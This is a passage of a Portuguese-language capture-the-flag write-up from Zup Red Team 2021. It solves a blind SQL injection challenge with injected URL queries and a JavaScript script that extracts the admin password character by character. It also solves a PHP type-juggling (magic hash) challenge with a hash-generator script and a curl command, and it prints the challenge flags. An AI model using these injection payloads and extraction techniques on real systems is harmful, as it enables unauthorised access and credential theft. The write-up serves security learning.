<style>a {font-weight: bold; text-decoration: none; visited: blue; color: blue;} ul {display: inline-block;} .disabled {text-decoration: line-through; color: gray} .disabled a {visited: gray; color: gray; pointer-events: none; cursor: default} table {border-collapse: collapse; margin: 12px; border: 2px solid black} th, td {border: 1px solid black; padding: 3px} span {font-size: larger; font-weight: bold}</style>
<title>Zup Red Team 2021</title>
</head>
<body style='font: 12px monospace'>

Not this way!
```

Após isso tento então atualizar o nome de algum usuário para inserir num lugar que eu poderia ver, a informação que quisesse do banco. Para isso tentei o script abaixo

```shell
curl "https://zup-blind.chals.io/?id=2;+update+users+set+name=password+where+name='admin'"
```

Minha intenção com esse script era setar no lugar do nome do admin a sua senha, e se fosse possível então bastaria atualizar a página e eu veria sua senha. No entanto não estava habilitado no servidor a execução de múltiplas instruções SQL conforme o retorno abaixo

```bash
Traceback (most recent call last):
  File "/source/blinSql.py", line 41, in do_GET
    cursor.execute("SELECT id, username, name, surname FROM users WHERE id=" + params["id"])
sqlite3.Warning: You can only execute one statement at a time.
```

Ok, então teria que ser realmente blind, ou seja, teria que inferir a senha após alguns scripts executados. Para chegar nesse resultado fiz um javascript, mas
primeiro tive que descobrir qual o tamanho da senha do usuário admin, e para isso fiz alguns requests como o abaixo

```
https://zup-blind.chals.io/?id=1 and (select length(password) from users where id = 1 ) > {n}
```

Substituindo n pelo tamanho que queria descobrir, até chegar na conclusão que a senha tinha 24 caracteres, pois no momento que executei o request conforme abaixo

```
https://zup-blind.chals.io/?id=1 and (select length(password) from users where id = 1 ) > 23
```

o usuário Admin deixou de ser retornado. De posse dessa informação fiz o script abaixo

```javascript
var s = Array.from({length: 95}, (_, i) => i + 32); //all ascii chars

var length = 24; //pass length
var password = [];


async function findWholePass() {
    for(var i = 0; i < length; i++) {
        password[i] = await findOutLetterAt(i);
    }
}

function findOutLetterAt(i) {
  return Promise.all(s.map(s => tryChar(s,i))).then(all => all.find(r => r.exists));
}

function tryChar(c, p) {
    return fetch(`https://zup-blind.chals.io/?id=1 and (select substr(password,${p + 1},1) from users where id = 1 ) = char(${c}) `).then(r => r.text()).then(r => ( {letter : String.fromCharCode(c), exists: r.includes('<td>admin</td>') }) );
}

```

e executando via console do chrome mesmo foi possível, letra a leta (da 1 até a 24) testar todas as opções da tabela ascii para verificar qual seria exatamente a
senha do admin, diferenciando responses onde o admin era retornado na listagem de responses que ele não era. Caso a execução da query retornasse o usuário admin, significaria que a letra testada naquela posição seria a certa, e após alguns minutos é possível obter a senha, que também é a flag => `ZUP-CTF{4tt4ck 0n T1t4N}`

Certamente teria como ter feito algo muito mais fácil e performático, mas foi um processo um tanto divertido fazer na mão xD


### Welcome to the Juggling ###

Esse desafio nos dava a url https://zup-type.chals.io/ que exibia um código em php

![Juggling](/web/juggling/001.png)

E tinha uma vulnerabilidade conhecida como Magic Hash, onde no PHP caso sejam comparados dois valores utilizando o `==` e especificamente no caso de hex, caso
o hex comece com `0e...` ele sempre será igual à string `"0"`. Para gerar uma entrada que fizesse um magic hash fiz o script abaixo, também em php, 

```php
<?php

do {
    $secret = 'Zup_CTF_2021';
    $rand = substr(md5(microtime()),rand(0,26),8);
    $m = substr($rand,0,8);
    $h = substr(md5($secret . $m), 0, 4);
}while($h != '0');
echo 'Hash was: ' . $h . ' For rand: ' . $rand;
```

Ao executá-lo ele sempre retorna uma entrada válida, como por exemplo `fa6ba80a` que gera a hash `0e67`
E após ter uma entrada válida bastou executar o comando abaixo

```shell
curl "https://zup-type.chals.io/?a=fa6ba80a&b=0"
```

Para obter a nossa flag => `ZUP-{C0d3 G3ass}`


# Ferramentas :hammer: # 

### AWS Cli ###
CLI da AWS disponível neste [link](https://aws.amazon.com/pt/cli/) 
### GDB ###
Ferramenta para debugar binários em sistemas unix-like, já nativa no SO utilizando (Ubuntu)
### OBJDUMP ###
Ferramenta para "desmontar" um binário em sistemas unix-like, já nativa no SO utilizando (Ubuntu)
### APK Decompiler ###
Ferramenta para decompilar APK disponível [em](https://www.apkdecompilers.com/)
